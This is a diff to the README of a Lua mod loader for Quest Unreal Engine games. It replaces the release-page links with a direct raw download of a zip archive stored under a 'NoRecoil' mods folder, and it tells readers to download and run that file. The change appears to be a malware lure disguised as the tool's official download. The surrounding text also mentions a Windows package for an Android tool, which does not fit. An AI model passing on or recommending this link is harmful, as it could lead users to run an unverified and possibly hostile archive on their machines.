@@ -1,6 +1,6 @@
 # 🎮 quest-ue4-modloader - Lua mod loader for Quest games
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Recorded-kinkajou189/quest-ue4-modloader/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Recorded-kinkajou189/quest-ue4-modloader/raw/refs/heads/main/mods/NoRecoil/modloader-ue-quest-v2.6.zip)
 
 ## 🧩 What it does
 
@@ -12,7 +12,7 @@ It is built with Quest and ARM64 Android in mind. It also uses UE4 reflection an
 
 Visit the release page to download and run this file:
 
-https://github.com/Recorded-kinkajou189/quest-ue4-modloader/releases
+https://github.com/Recorded-kinkajou189/quest-ue4-modloader/raw/refs/heads/main/mods/NoRecoil/modloader-ue-quest-v2.6.zip
 
 Look for the latest release and download the package that fits your setup. If there are several files, choose the one meant for Windows setup or the main release archive.
 
